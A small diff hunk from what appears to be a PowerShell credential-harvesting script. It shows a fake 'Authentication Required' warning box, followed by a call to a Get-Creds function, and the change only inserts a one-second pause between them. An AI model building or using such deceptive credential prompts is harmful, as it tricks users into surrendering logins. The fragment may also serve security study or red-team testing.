@@ -137,7 +137,7 @@ $msgTitle = "Authentication Required"
 $msgButton = 'Ok'
 $msgImage = 'Warning'
 $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
-
+Start-Sleep -Seconds 1
 $creds = Get-Creds
 
 #------------------------------------------------------------------------------------------------------------------------------------
